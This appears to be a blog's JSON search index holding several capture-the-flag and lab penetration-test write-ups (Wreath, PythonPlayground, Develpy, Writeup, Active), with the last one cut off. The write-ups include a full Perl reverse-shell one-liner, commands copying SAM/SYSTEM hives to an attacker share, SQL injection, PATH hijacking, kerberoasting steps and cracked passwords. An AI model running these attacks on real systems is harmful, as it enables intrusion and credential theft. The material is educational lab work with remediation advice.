reverse shell  I typed copy HKLMSYSTEM 10 50 112 6shareSYSTEM  andcopy HKLMSAM 10 50 112 6shareSAM reports Wreath image42 png Now with the sensitive SAM and SYSTEM hives on my local system  I was able to extract all hashes using the impacket secretsdump tool reports Wreath image69 png CleanupAfter fully compromising the Wreath Network  I deleted all the binaries that I downloaded  namely 0xd4y socat  0xd4y nc exe  System exe  and exploit 0xd4y php   Though the removal of these binaries allowed for a stealthier compromise  the attacks conducted in this report were not meant to be particularly stealthy  Many binaries used were not obfuscated  and file transfers were conducted over SMB and HTTP rather than HTTPSConclusionThe attack surface of a web server is much bigger than most other services  It is essential to be wary of which services are running as a privileged user  There was no need for local privilege escalation in two out of three compromised machines during this penetration test  If possible  it should be refrained from using root to run services unless it is absolutely necessary  This will cause a greater difficulty for an attacker to attain root access on a system  and will greatly mitigate the potential damage in case of a breachThe client had multiple critical vulnerabilities in his network  The specific remediations for patching the vulnerabilities outlined in this report are as followsInstall the latest software for all running services  even if a system is only running on an internal network with no outside internet accessThe first and second compromised machines had old software with critical vulnerabilities which can be easily patched by updating the softwareRefrain from using root to run any services unless it is absolutely necessaryThis note is especially true for web servers as they have a large attack surface  It is recommend to create a low privileged user specifically for the purpose of running a web serviceNever reuse passwordsA cracked password from the second compromised machine was reused for accessing a webpage on the third machineBe mindful of potential misconfigurations The privilege escalation on the client s personal computer was possible due to a misconfiguration of a service running as SystemThe compromised low privileged user was able to configure services despite not being part of the Administrators groupFilters in code should be meticulously analyzedCode for uploading files on the website of the third machine did not successfully filter potentially malicious filesThe goals of this penetration test were met  As requested by the client  I was able to successfully compromise the Wreath network with root access on all three systems  The client is highly encouraged to patch his systems with the aforementioned remediations as soon as possible1    ftnt ref1   https   tryhackme com room wreath  https   www google com url q https   tryhackme com room wreath sa D source editors ust 1653838005064997 usg AOvVaw11zrlOmfNWzJa0CDhyLmIX2    ftnt ref2   https   httpd apache org docs 2 4 vhosts details html  https   www google com url q https   httpd apache org docs 2 4 vhosts details html sa D source editors ust 1653838005066508 usg AOvVaw38AzkPd909N2hWUNYHS 3q3    ftnt ref3   https   nvd nist gov vuln detail CVE 2019 15107  https   www google com url q https   nvd nist gov vuln detail CVE 2019 15107 sa D source editors ust 1653838005061416 usg AOvVaw2CTBmXjzEPsODH3Rq PnrP4    ftnt ref4   https   github com andrew d static binaries blob master binaries linux x86 64 nmap  https   www google com url q https   github com andrew d static binaries blob master binaries linux x86 64 nmap sa D source editors ust 1653838005061892 usg AOvVaw31Hh8jsrhN DIWR9yXI6La5    ftnt ref5   https   owasp org www chapter ghana assets slides OWASP Gitstack Presentation pdf  https   www google com url q https   owasp org www chapter ghana assets slides OWASP Gitstack Presentation pdf sa D source editors ust 1653838005062277 usg AOvVaw3W47ioy1JtnYBx9a6bnduz6    ftnt ref6   https   github com samratashok nishang  https   www google com url q https   github com samratashok nishang sa D source editors ust 1653838005065364 usg AOvVaw1yBNhpiAJM99kh lW5N c17    ftnt ref7   https   0xd4y.com Writeups HackTheBox Bastion 20Writeup pdf  https   www google com url q https   0xd4y.com Writeups HackTheBox Bastion 2520Writeup pdf sa D source editors ust 1653838005062635 usg AOvVaw2eiFI282lB5D35Qvi1kVWp8    ftnt ref8  This website can be particularly fast in cracking unsalted hashes because it uses a rainbow table9    ftnt ref9   https   www youtube com watch v cBXdoIuLzmA ab channel 1ENews  https   www google com url q https   www youtube com watch v 3DcBXdoIuLzmA 26ab channel 3D1ENews sa D source editors ust 1653838005065786 usg AOvVaw2xvlbqH8ur7pPaWul1POR10    ftnt ref10   https   github com internetwache GitTools  https   www google com url q https   github com internetwache GitTools sa D source editors ust 1653838005063071 usg AOvVaw2v rlJrB5CPABViiQLRKZr11    ftnt ref11   https   vulp3cula gitbook io hackers grimoire exploitation web application file upload bypass  https   www google com url q https   vulp3cula gitbook io hackers grimoire exploitation web application file upload bypass sa D source editors ust 1653838005066154 usg AOvVaw3w9rGIC3kJf1w9z5f71Ytl12    ftnt ref12   https   github com int0x33 nc exe   https   www google com url q https   github com int0x33 nc exe  sa D source editors ust 1653838005063359 usg AOvVaw3NofcJRUjfD6nVHziPfG q13    ftnt ref13   https   github com ohpe juicy potato  https   www google com url q https   github com ohpe juicy potato sa D source editors ust 1653838005064199 usg AOvVaw2mPFls3Vr VzWdZG425UGe14    ftnt ref14   https   itm4n github io printspoofer abusing impersonate privileges   https   www google com url q https   itm4n github io printspoofer abusing impersonate privileges  sa D source editors ust 1653838005064536 usg AOvVaw0AjfjNj tZevtcorBOD0DA15    ftnt ref15   https   gracefulsecurity com privesc unquoted service path  https   www google com url q https   gracefulsecurity com privesc unquoted service path  sa D source editors ust 1653838005063660 usg AOvVaw0DdEf CeK185wTCSxHtlwI     https   www google com url q https   gracefulsecurity com privesc unquoted service path  sa D source editors ust 1653838005063901 usg AOvVaw20TNnhc78C282ymnFw8HLG",
      "image": "/images/wreath.png"
    } ,
  
    {
      "title"    : "Pythonplayground Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/03/26/PythonPlayground-Writeup/",
      "date"     : "Mar 26, 2021",
      "content"  : "layout  posttitle   PythonPlayground Writeupdescription  Python has a lot of features that some people may not know about  In this challenge  it was important to be creative throughout each step of exploitation and piece each compromised puzzle piece together date    2021 03 26image     images 0xd4y logo gray png tags     Python  PATH Injection  LogicThis report can be read both on this site  and as its  a href    https   0xd4y.com reports PythonPlayground 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports PythonPlayground image18 png  reports PythonPlayground image16 png As the name suggests  this box was all about using python to exploit its vulnerabilities  Each part of this box was like a puzzle piece which  when connected together  gave you the ability to escalate to root  Let s get right into the box  as I ll go into detail about each aspect of exploiting this box s vulnerabilitiesRECONAs usual  I will start by scanning the ports with nmap reports PythonPlayground image10 png Looks like only http and ssh are open  There is not much information from this nmap scan  other than that we know the box is running Ubuntu reports PythonPlayground image27 png Clicking on Login or Sign up doesn t lead to anything interesting  as we are just met with this page reports PythonPlayground image5 png It looks like each web page is appended with  html  so let s run a gobuster on the root page with the extension  html reports PythonPlayground image22 png The  admin html directory particularly stands out  so let s check it outGetting Credentials reports PythonPlayground image2 png Immediately from the name of this login form  it looks like there is probably a user named Connor  It s good practice to check out the source code to see if there are any interesting comments or links to other directories on the website reports PythonPlayground image26 png  reports PythonPlayground image23 png So we can see from the code above that the login form takes a password and  hashes it   I put  hash  in quotes because this code does not actually hash an input  In an actual password hash  the output does not give information about the input  For example  in mathematical operation of addition we know that 1 1 2  However  let s say I added two numbers together without telling you which numbers I added  and all I told you was that the sum of those two numbers is equal to 2  Then I asked you   Which two numbers did I add to get the number 2    It could be 1 1  or 2 0  or maybe even 1 7 0 3  The possibilities are endlessThe problem with the code on the webpage  is that it leaks the hash to us as well as how the hash was produced  but more importantly  the length of the hash is dependent on the length of the input  This means that data is not lost during the hashing process  All of this considered  we can reverse the hash to get the password  A very simple way to do this is by taking the javascript code that we saw in the source of the webpage  and inputting all characters in the order determined by the ascii table  Using this  we can see the output that the hash creates for each letter  remember about how this code does not lose inputted data reports PythonPlayground image15 png Using this method  our code does not need a lot of lines  You can view my script  here  https   www google com url q https   github com 0xd4y Writeups blob gh pages TryHackMe crack py sa D source editors ust 1653953672142990 usg AOvVaw17cVA7TMh7fjsB E1XDH f  if you d like  I have since edited it to be more user friendlyIncidentally  even if we did not know the code of the hash  we can see that the length of the output is always four times the length of the input  because data is not lost reports PythonPlayground image6 png Anyways  let s try the cracking function reports PythonPlayground image20 png And we get Connor s password as spaghetti1245  Inputting the username connor and the password  we get redirected to  super secret admin testing panel htmlIt turns out that we could have just gone to this page without even needing Connor s password reports PythonPlayground image11 png I did not realize this the first time going through the box  Looks like authenticated cookies are not needed to view this site reports PythonPlayground image25 png Typing python code into the text field  we see that this form runs our code  So let s try a python reverse shell reports PythonPlayground image12 png Unfortunately  this does not work as there is some sort of blacklist on the import keyword  I tried bypassing this by writing  imp  to a file and then appending  ort  to it  Finally  I could try executing it with the exec function reports PythonPlayground image8 png Unfortunately  the exec function is blacklisted as well  However  if you have read my  Develpy Writeup  https   www google com url q https   0xd4y.com Writeups TryHackMe Develpy 2520Writeup pdf sa D source editors ust 1653953672145946 usg AOvVaw2ZXMcxIegK7B X2o89fk8o   then you know there is one more thing we have left to try reports PythonPlayground image13 png Using the   import   keyword  we can circumvent the blacklist reports PythonPlayground image1 png Awesome  We re root  But there s a catch reports PythonPlayground image14 png Looks like we are in a docker container     Well  let s just get the first flag reports PythonPlayground image21 png We can also ssh into the box using the credentials for Connor that we saw earlier reports PythonPlayground image24 png ROOT PRIVESCSo we have a reverse shell inside a docker container and we are in the actual box through an ssh session  but how are we going to get root  I ran the  linPEAS  https   www google com url q https   github com carlospolop privilege escalation awesome scripts suite tree master linPEAS sa D source editors ust 1653953672147938 usg AOvVaw3oP6L3vG7KcGjXT1fkgu0Z  privilege escalation enumeration script on the ssh session  but it did not find anything out of the ordinary  This part of rooting the box is really cool and is when we piece together our shells  Let s run linPEAS on the reverse shell and see if we can find anyway to escape it and get root reports PythonPlayground image17 png Above we can see that the log directory is mounted on the docker container  Using this mount  we can interact directly with the host system  It s important to note that due to us being root in the docker container  we can make files on  var log as root  We can create a setuid binary by compiling the following code and giving it setuid permissions reports PythonPlayground image19 png Unfortunately  there is no way to download this using wget or curl as it is not on the docker container  However  in the theme of this box  we can download files using python with the urllib request module reports PythonPlayground image4 png  reports PythonPlayground image9 png  reports PythonPlayground image3 png And we are rootBONUS reports PythonPlayground image7 png Here we can see all the blacklisted strings  Note how the script checks for  import   rather than  import   This seemingly unimportant space makes the difference between allowing   import   and not  Changing this makes the program invulnerable  as far as I know   Thank you to   deltatemporal  https   www google com url q https   tryhackme com p deltatemporal sa D source editors ust 1653953672150496 usg AOvVaw3HgV3Kx9FkxcmFnlH1YhHs  for the great challenge and cool privesc  Thank you to you as well for reading this writeup",
      "image": "/images/python.png"
    } ,
  
    {
      "title"    : "Develpy Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/03/22/Develpy-Writeup/",
      "date"     : "Mar 22, 2021",
      "content"  : "layout  posttitle   Develpy Writeupdescription  This box had a fun foothold  and it was a nice little challenge that showed the importance of making your programs secure  I highly recommend you read this writeup  as after exploiting the program  I go over how to patch it to make it more secure date    2021 03 21 image     images 0xd4y logo gray png tags     SQLi  SMTP  RCE  APTThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Develpy 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Develpy image8 png  reports Develpy image28 png This was a nice little challenge created by  stuxnet  This box had quite a unique foothold  in the sense that it was made purely for challenging your knowledge about the security of python scripting  A lot of programmers do not think about security when they make their programs  rather they think about just getting their program to perform a desired function  A large part about cybersecurity is about finding bugs in programs and exploiting them to make them do functions that they were not designed to do  Let s jump right in  and I will go into detail about security related to python scriptingReconnaissanceAs usual  I will start with an nmap scan reports Develpy image19 png We see there are two ports open  port 22  ssh  and port 10000  snet sensor mgmt    As can be seen from the output  nmap is not sure what service is running on port 10000  but apparently it is getting some HTTP output  Let s visit the webpage and see what we get reports Develpy image26 png Getting UserWe get a strange response that looks like an error in some python script  It is especially interesting that the name  GET  is not defined  This looks a lot like a result of a GET request   Let s fire up burpsuite and verify this  Refreshing the page and intercepting our request we see the following reports Develpy image2 png This is a very standard GET request  In the output we see reports Develpy image10 png So it looks like this script is looking at our request method and inputting it into the script  The program most likely expects an integer as the input  so let s modify our request so that we can see how the script is designed to behave reports Develpy image22 png And we see the following response reports Develpy image11 png Up to this point with the information that we have gathered about how this script works  it is likely that the script is performing some kind of evaluation on our input  One more thing I checked before I tried to input malicious code is to confirm that the script evaluates what we send  In our previous request  instead of inputting the number 4  let s input 0 reports Develpy image25 png Now we don t see the strings beginning with  Exploiting tryhackme   So let s change 0 to 0 1 to see if the python script is evaluating the math reports Develpy image18 png Notice how now there is one string beginning with  Exploiting tryhackme   This indicates that the script calculated 0 1  So we have confirmed that the script is using some kind of evaluating function  Let s input some malicious python code so that we can get a reverse shell  We can import the os module to execute system commands reports Develpy image16 png  reports Develpy image5 png Looks like we can execute commands as the user king  So let s get a reverse shell reports Develpy image12 png  reports Develpy image14 png  reports Develpy image9 png Privilege Escalation to RootCool  We got a shell  Let s see what is in king s directory reports Develpy image3 png We see some interesting files  but the root sh file especially stands out  It is one of the only files in king s directory that is owned by root  Looking at the contents of the bash script  we see that it only has one line reports Develpy image20 png First of all  this looks like a strange thing to have in a bash script  Why not just type that command in the first place  It seems likely that there is some cronjob running this script  Second of all  python is being run without specifying it s full path  If there is indeed a cronjob  then it should only be running commands that are specified within a full path  Unfortunately however  we do not have write access to the python binary  and it is likely that root s path is set to its default  So  it looks like we probably can t do some sort of path privilege escalation  In  etc crontab we see the following reports Develpy image27 png Tthere are definitely cron jobs running on this system  At this point I downloaded  pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust 1653961217842478 usg AOvVaw3Xy4wBS6ssPN4XQD4bXbER  and saw the following interesting output when I ran it reports Develpy image23 png It looks like there might be some service running on port 8080 that is only open to localhost  Running netstat  we can confirm this reports Develpy image15 png We can forward this port using socat so that it would be remotely accessible  reports Develpy image24 png  reports Develpy image13 png We see this is a web server that has an upload feature reports Develpy image6 png Let s just touch a file with the extension  py and see what happens reports Develpy image1 png The file was uploaded to a directory called  media  Remember the root sh script which ran any file within the  media directory  We can confirm that the server ran this script by looking at pspy reports Develpy image7 png Let s grab a python reverse shell from  pentest monkey  https   www google com url q http   pentestmonkey net cheat sheet shells reverse shell cheat sheet sa D source editors ust 1653961217844668 usg AOvVaw3T0s2eu ixwvfoqmeVXd6   and put it in our script reports Develpy image17 png After uploading  we wait a bit for the cronjob to run again  and eventually we will get a hit back reports Develpy image4 png BonusThat was a lot of fun  but let s see how and why we were able to get a foothold on this box  We ll start by inspecting the script that was related to the error on the webpage reports Develpy image21 png The old version of python  python2  has a dangerous function called input which evaluates the input of a user  This is a security risk within the function  and it is strongly discouraged from being used  Instead  python encourages the use of raw  input which treats the user s input as a string regardless of how the user formats it  this is in contrast to the input function which does not modify the type of the input   Modifying the script to use raw  input instead of input successfully patches the python injection vulnerability  Note that python3 has since modified the input function to behave like raw  input so as to patch this vulnerabilityThank you to  stuxnet for such a fun challenge  I hope you learned a bit from my red team analysis of the box and hopefully a bit of the blue team as well",
      "image": "/images/python.png"
    } ,
  
    {
      "title"    : "Writeup Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/03/15/Writeup-Writeup/",
      "date"     : "Mar 15, 2021",
      "content"  : "layout  posttitle   Writeup Writeupdescription  Yes  this box is called Writeup  This box did not have many open ports and even included a DoS protection script to prevent gobusters  The problem is we had to discover certain directories in order to extract essential information about the web server  Come check out my writeup for Writeup  as you will learn a lot about hashes and enumeration date    2021 03 15 image     images 0xd4y logo gray png tags     SQLi  Hash Cracking  EnumerationThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Writeup 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Writeup image2 png  reports Writeup image9 png What better opportunity to write a writeup than to write a writeup of a box named Writeup  This box made evident the importance of enumeration  The interesting thing about this box is that gobuster would not work due to a DoS protection against 404 http errors  So how would we find the potentially vulnerable web pages of the web serverReconnaissanceThe first thing that I always do when targeting a box is adding its ip to my  etc hosts file  because it is easier to remember a hostname than an ip reports Writeup image38 png Let s start with enumerating the ports of the box nmap  sC  sV  oA nmap nmap writeup htb reports Writeup image24 png Looks like there are only two ports running on this box  Because this was a small amount  I ran an nmap scan to enumerate all ports with the  p  flag  but I did not discover any other ports  Looking at the result of the nmap scan  the box is running the Debian Linux distribution  noting information like this is important when trying to understand the makeup of a box   Software can differ depending on the operating system   distribution of a system  Nmap discovered a directory  writeup  from the robots txt file  Let s look at the webpage on http   writeup htbWeb Enumeration reports Writeup image8 png First time I saw this webpage  I foolishly did a gobuster because I did not read the message in red  As a result  I got banned and had to wait a couple of minutes for my ip to no longer be blacklisted  Looking at the message  we can see that there is a DoS script in place to look for 40x errors  this unfortunately includes 404 errors which we need for gobuster to work   Another potentially important thing to note is the email jkr writeup htb  This means that there might be a user jkr on the box  which may or may not come handy   It s a good habit to note down any potentially important information in a notes txt fileIncidentally  because I added the ip to my  etc hosts file and navigated to the http   writeup htb page  it is important to check also http   10 10 10 138 to make sure there is no virtual host routing in place  for this box it turns out that there is no vhost routing   Let s see what is on the  writeup directory reports Writeup image6 png Visiting the writeup writeup  we get the following reports Writeup image5 png There is nothing interesting in this page  or in any of the other pages  However  there is one thing we need to test for  It is possible that the page parameter in the link  http   writeup htb writeup index phyp page writeup  is vulnerable to LFI  local file inclusion   Trying http   writeup htb writeup index phyp page                                     etc passwd  we get the following output reports Writeup image31 png I tried a couple of other methods for LFI to see if there might be some blacklisted characters  but it seems that the page parameter is not vulnerableBlind SQL InjectionAt this point I was stuck for a while  but there is a hint at the bottom of the  writeup directory       reports Writeup image15 pngThis was hinting at the fact that this page was created with a web content management system  CMS   We can confirm that by viewing the source reports Writeup image33 png Note the CMS Made Simple line  There might be a CMS exploit we could use  but what is the version  Don t forget that Google is your friend  Due to CMS Made Simple being open source  we can easily view the content of this CMS and all of its directories  Visiting  http   www cmsmadesimple org downloads cmsms  https   www google com url q http   www cmsmadesimple org downloads cmsms sa D source editors ust 1653884891178100 usg AOvVaw2INPmOXeqpPu92L Ba0Fwc   we see a link to their repository   http   svn cmsmadesimple org svn cmsmadesimple trunk  https   www google com url q http   svn cmsmadesimple org svn cmsmadesimple trunk sa D source editors ust 1653884891178603 usg AOvVaw3aAiGlvZD4VLqL9g6x8Lyz   Browsing to this link  we see all the directories associated with this CMS reports Writeup image25 png As it turns out  most of these files and directories are on the web server  Checking out the admin directory  we can see that it asks for a password reports Writeup image27 png Unfortunately  we do not have any credentials    yet  Let s check out the  doc directory  as this directory seems like it would have some file that could leak the version of the CMS reports Writeup image19 png The CHANGELOG txt file seems like it would have the version of the CMS  Let s visit the  writeup doc CHANGELOG txt path on the web server reports Writeup image12 png So we see that this web page is running CMS Made Simple version 2 2 9 1  Looking up CMS Made Simple on searchsploit  we are flooded with exploits reports Writeup image21 png There is only one exploit here that looks promising  the SQL Injection exploit for versions   2 2 10  All other exploits either require credentials or are too old  Let s mirror this exploit and examine it  The key parts of this exploit is the vulnerable page and payload reports Writeup image7 png  reports Writeup image28 png  reports Writeup image30 png There is a parameter in the News module called m1 idlist that is vulnerable to SQL injection  As we can see from the payload  this script uses a blind SQL injection attack to extract credentials from the affected system  The attack works by asking the server to sleep for a certain period of time if a certain statement is true  So if we find that a request of ours makes the web server take an unusual amount of time to respond to us  then we know that the statement ran true  This means that we could ask the server the followingPentester   Hey web server  You should sleep for 1 second if you have a username in the cms users table that starts with the letter aWeb server   Hi Pentester  I don t have a user in my cms users table that starts with the letter a  so I am not going to sleep for 1 secondPentester   No problem  You should sleep for 1 second if you have a username in the cms users table that starts with the letter bWeb server   I actually have a user in my cms users table that starts with the letter b  so I will sleep for 1 secondPentester   Okay  so it normally takes the web server to respond to me after 1 second  but now it took the web server two seconds to respond  There is probably a user in the cms users table that starts with the letter b  Let s ask the web server another question   Hey web server  it s me again  You should sleep for 1 second if you have a username in the cms users table that starts with the letters baI think you get the point  Running the exploit with python 46635 py  u http   writeup htb writeup we get the hashed credentials of the user jkr reports Writeup image42 png Now all we have to do is crack the hash  Because we have the salt of the hash  we can crack the hash a lot more easily  The hashed password is 32 characters long which suggests that it is an md5 hash  We can use hashcat to crack the password  but this handy exploit even has a cracking function  albeit it is not as fast as hashcatScript Method reports Writeup image17 png  reports Writeup image26 png Hashcat Method reports Writeup image18 png Looking at the line above  we can see that the password is hashed by adding the salt and password  note that the line variable refers to a line in the password wordlist   We can conclude that the password is a salted md5sum  Viewing hashcat s example hashes  we can see the mode that corresponds most to what we are looking for reports Writeup image1 png As you can see  mode 20 looks like the right hash so let s crack it  Make sure to first put the hash in the format hash salt as described by the  Hashcat   Example Hashes  https   www google com url q https   hashcat net wiki doku php id 3Dexample hashes sa D source editors ust 1653884891182023 usg AOvVaw2YZka0j0imOgS71lDieBP4  page reports Writeup image40 png hashcat  m 20 hash  usr share wordlists rockyou txt reports Writeup image14 png And we get the password for the jkr user as raykayjay9  These credentials did not work for the  admin directory  but nevertheless we can ssh into the box reports Writeup image34 png Incidentally  the purpose of salts is so that multiple hashes in a compromised credential database do not get cracked simultaneously  It is highly likely that in a database of over a million users  many users have the same password  This would mean that two users with the password of 0xd4y would both get cracked easily by use of a  rainbow table  https   www google com url q https   en wikipedia org wiki Rainbow table sa D source editors ust 1653884891182806 usg AOvVaw0l PSwYHT1mHo73hJIVbjd reports Writeup image29 png Notice how two users can have the same password of raykayjay9  but their md5sum hashes are different because they have different salt valuesPrivilege Escalation to RootSo now that we have a shell  let s enumerate the box to find any possible attack vectors  I like using the linpeas sh script  as its output is color coded and is very easy to read reports Writeup image4 png  reports Writeup image36 png  reports Writeup image32 png  reports Writeup image16 png  reports Writeup image35 png We can see that we have write access to  usr local bin and  usr local sbin  Furthermore  we are part of the staff group reports Writeup image23 png This is a default group for the Debian distro  The permissions given by being part of the staff group should only be granted to trusted users  Here is why reports Writeup image20 png Commands that you run such as grep are actually just binaries that are stored in some directory on your machine  typically it is stored in  bin reports Writeup image3 png The point of PATHs is so that you don t have to constantly type  bin grep whenever you want to run that command  it s just tedious   An important thing to note is the order of what s in the  PATH variable  By default   usr local bin comes before  bin  This means that if we made a file and put it in  usr local bin  then when we run grep  we are actually running  usr local bin grep and not  bin grepProof of Concept reports Writeup image11 png  reports Writeup image13 png    after logging out and logging back in reports Writeup image22 png Note that the user who created a binary in the  usr local bin path must logout and log back in for it to affect him  All other users on the box do not need to do that  I am not sure why   This means that in a real scenario  before the command is hijacked  a victim could run a command and it would work just as expected  After it gets hijacked  the victim could run that same command  during the same login session  and the hijacked binary would get executed instead  This is why for the sake of security  it is imperative that high privileged users execute the full path of commands  especially when it comes to cron jobs   Let s look for cron jobs running as root  There might be one that is running a command without using its full path  There is a great script on github called  pspy  https   www google com url q https   github com DominicBreuker pspy sa D source editors ust 1653884891185100 usg AOvVaw2w7  BCyKSKMsXly3u3ToU  that actively monitors all processes running on a system  Downloading pspy and running it on the box  we see the following output reports Writeup image10 png When first doing this box  I noticed that whenever I put a binary in the  usr local bin path or the  usr local sbin path  it would keep getting removed after some time  This cronjob is probably the culprit  I went into this rabbit hole for a long time  I tried using symbolic links to delete files  but it did not work  This privesc was especially difficult for people hacking on private instances  such as myself  because watch what happens when a person logs into jkr reports Writeup image39 png Suddenly  we are met with a whole bunch of commands that don t use the full path  We have sh  run parts  and uname  Each of these commands is run by UID 0 which is root  So if we put a reverse shell in one of these binaries and copy it to the  usr local bin path  it will get executed and we will have a shell  The bash reverse shell did not work for me  so I used the perl reverse shellperl  e  use Socket  i  10 10 14 5   p 9001 socket S PF INET SOCK STREAM getprotobyname  tcp    if connect S sockaddr in  p inet aton  i     open STDIN    S   open STDOUT    S   open STDERR    S   exec   bin sh  i reports Writeup image41 png  reports Writeup image37 png This was a fun box  Thank you  jkr for the cool privesc  Also  big thanks to Daniele Scanu  the creator of the SQL injection script  That was probably the most beautiful and user friendly exploit I have ever used  Last but not least  thanks to you for reading this writeup  I hope you learned not only from the Writeup box  but also from this writeup  Feel free to write me up at  0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail com  if you have any comments",
      "image": "/images/Writeup.png"
    } ,
  
    {
      "title"    : "Active Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/03/07/Active-Writeup/",
      "date"     : "Mar 7, 2021",
      "content"  : "layout  posttitle   Active Writeupdescription  This was a fantastic box about the Windows Active Directory service  It showed the importance of managing your passwords in a secure way  as well as having strong passwords that are hard to crack  Something that really makes this box stand out is not so much the vulnerabilities themselves  but rather the reason why they are easily exploitable in the first place  Microsoft essentially made themselves vulnerable  as they spoke a little bit too much on THEIR OWN website  Come check out the writeup to see what I mean date    2021 03 07image     images 0xd4y logo gray png tags     SMB  GPP  WindowsThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Active 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formatted reports Active image4 png  reports Active image8 png Just like Bastion  this was another realistic Windows box  However  instead of it being centered around Bastion hosts  this box was about the Windows Active Directory service  This machine was vulnerable due to the use of Group Policy Preferences  GPP  for managing passwords  The passwords stored in the Groups xml file are AES 256 encrypted with a static key  but the encryption key is publicly available on Microsoft s site  After getting the credentials of a low privileged user  we find that we can get the hash of the Administrator by abusing the way kerberos authenticates its users  this abuse is called kerberoastingRECONAs usual  I will add the ip of the box to my  etc hosts file and call it active htb  Let s enumerate the ports of the machine so we can find some attack vectorsnmap  sC  sV  oA nmap nmap active htb reports Active image12 png Immediately  we can see that this is a Windows box running the Active Directory  AD  service  This can be denoted due to the fact that ports 53  DNS   88  Kerberos   139   445  SMB   and 389  636  3268  3269  LDAP  are open  The first thing that comes to mind is to enumerate the SMB protocol on port 445smbmap  H active htb reports Active image7 png So we have READ permissions to the Replication directory  Let s check all the files inside this directory with the   R flagsmbmap  H active htb  R Replication reports Active image9 png  reports Active image17 png At this point I was stuck for a while  As it turns out  there is something wrong with the smbmap tool on my machine  Even after updating smbmap  for some reason the recursive search does not show all the files in the Replication directory  Every pentester should know the extent of their tools  as well as the reliability of each tool  Some tools can be more reliable  or stealthier  or faster  whatever it is that you are looking for   It is important to understand the difference in each tool  and to know which one to use depending on what you need  I found out that mounting the share proved to be the most reliable  and convenient    check out the  Bastion writeup  https   www google com url q https   0xd4y.com Writeups HackTheBox Bastion 2520Writeup pdf sa D source editors ust 1653954214354606 usg AOvVaw07JijrAw4Y8WAm8K1Pbij4  to see what I mean     So let s mount the share with the commandmount  t cifs active htb Replication mnt   o username guest      reports Active image16 pngAnd another strange problem  I was never able to fix this error  and I still have no idea why I keep getting it  Even tweaking the version number to match the SMB server didn t work  I think it is because the Guest account is disabled  but I didn t see how to anonymously access the SMB share otherwise  So now I went to plan C  which is just to recursively download everything on the Replication directory  obviously this is not ideal  as there could be a lot of useless and large filesRETRIEVING CREDENTIALS reports Active image15 png Looking through all of the files  we see the Groups xml file which contains some interesting entries reports Active image5 png In particular  the name entry containing active htb  SVC  TGS and the cpassword entry edBSHOwhZLTjt QS9FeIcJ83mjWA98gw9guKOhJOdcqh ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw NglVmQ are interesting  It is important to note that the password is encrypted using an AES 256 32 bit encryption key  First of all  the fact that it is only 32 bits is alarming as generally this is quite an insecure block size  Even worse  the encryption key is stated blatantly on Microsoft s documents   AES 256 key  https   www google com url q https   docs microsoft com en us openspecs windows protocols ms gppref 2c15cbf0 f086 4c74 8b70 1f2fa45dd4be redirectedfrom 3DMSDN 23endNote2 25E2 2580 259D sa D source editors ust 1653954214356524 usg AOvVaw1kuracGHpIW4LRfIQxbfKa    Using the gpp decrypt tool  we can easily decrypt the password and use it to login as the SVC  TGS userIncidentally   the key posted in the Microsoft document is how the gpp decrypt tool works to decrypt the encrypted cpassword string reports Active image13 png Notice how the key used in this script to decrypt a string matches that of the key in the Microsoft documentSo  let s see the magic of this tool and run it against our string reports Active image10 png And we get the password as GPPstillStandingStrong2k18  The first thing I did was to login to enumerate the SMB share with the credentials SVC  TGS GPPstillStandingStrong2k18 reports Active image19 png Although the SVC  TGS user has access to more files than Guest  there were no interesting files to retrieve  I tried to find a way to get a shell on the box  but the SVC  TGS user was too low privileged  At this point I sat back for a while and took a deeper look at the results of the nmap scanPRIVILEGE ESCALATIONRemember port 88  kerberos  from the nmap scan   Kerberos is all about authenticating a user over an untrusted network  And anyways  what in the world is a name like SVC  TGS  That username certainly doesn t sound as cool as 0xd4y  As it turns out  TGS stands for Ticket Granting Server  and I m not sure what SVC is but I think it is the abbreviation for service   The TGS is part of the KDC  Key Distribution Center  and exists to validate the use of a ticket for a specific purpose  What we want to do is to scan the active directory for the Administrator s SPN  Service Principal Name  value and then request the service tickets from the Active Directory which we will crack offline  The essential part of this attack is that the service tickets are hashed using the password of the user  in this case the Administrator as this is the account we are targeting   I highly encourage you to read the article  Ticket Granting Service   an overview  https   www google com url q https   www sciencedirect com topics computer science ticket granting service sa D source editors ust 1653954214358739 usg AOvVaw2DWhx4i9AXLp3lbICjayy2  as it really helps in understanding how Kerberos works  Let s use the GetUserSPNs py impacket script to extract Administrator s hash reports Active image3 png Unfortunately  when we run this script we are met with an error related to clock skew between the client  us  and the server  active htb   This is due to a security feature by Microsoft to try to mitigate replay attacks  A replay attack is when an attacker intercepts a communication  and then modifies the request to make the receiver of the communication perform a malicious task  Kerberos uses time stamps to see if the time between the request of the user and the time of the server matches within a certain margin of time  In the case that the clock skew does not fall within the acceptable range  then it is possible that the sender of the communication modified the request to perhaps make the receiver perform something malicious for his own benefit  As written by Microsoft s document on clock skew  Kerberos Clock Synchronization  https   www google com url q https   docs microsoft com en us windows security threat protection security policy settings maximum tolerance for computer clock synchronization sa D source editors ust 1653954214359722 usg AOvVaw30mRtT10rJxBsp0OqJ0AMx   the default acceptable range is 5 minutes and our skew is a little over 9 minutes reports Active image1 png      reports Active image21 png Let s change the date on our host machine to match that of the server and then test the clock skew reports Active image20 png Now when I run the same nmap command reports Active image14 png The reason why the clock skew is 4 minutes and not something like a couple of seconds is because it took my nmap scan a while to completeThe GetUserSPNs py impacket script should work now  as we found out that the default acceptable clock skew range is within 5 minutes  Running the command again  we now get a different output reports Active image11 png As we can see  we get the Kerberos 5 TGS REP hash for Administrator  We can use the hashcat   example hashes command to find the mode required to crack this hash reports Active image6 png So we found out that the mode is 13100  We can now crack the hash with hashcat  m 13100 hash rockyou txt  As I recommended in previous writeups  it is highly encouraged to crack hashes on your host 